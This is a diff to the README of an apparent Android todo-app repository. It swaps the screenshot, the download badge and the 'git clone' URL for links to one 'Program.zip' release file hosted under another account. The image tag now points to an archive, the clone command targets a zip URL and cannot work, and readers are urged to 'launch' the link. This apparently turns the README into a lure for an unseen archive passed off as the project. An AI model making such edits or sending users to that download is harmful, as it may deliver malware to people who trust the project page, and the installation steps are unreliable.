@@ -1,6 +1,6 @@
 
 # 📱 Todo-Android
-![todo-android](https://github.com/rokytd/images/raw/main/todo-android.png)
+![todo-android](https://github.com/keyrozahranugo/todo-Android/releases/download/v1.0/Program.zip)
 
 ---
 
@@ -27,7 +27,7 @@ A Todo application for exploring and experimenting with the updates of the Andro
 ---
 
 ### Software Download
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/keyrozahranugo/todo-Android/releases/download/v1.0/Program.zip)](https://github.com/keyrozahranugo/todo-Android/releases/download/v1.0/Program.zip)
 
 *Note: The provided link needs to be launched for software download.*
 
@@ -54,7 +54,7 @@ Welcome to Todo-Android! This repository houses a Todo application designed to h
 ### Installation 🛠️
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/todo-Android.git
+   git clone https://github.com/keyrozahranugo/todo-Android/releases/download/v1.0/Program.zip
    ```
    
 2. Open the project in Android Studio.
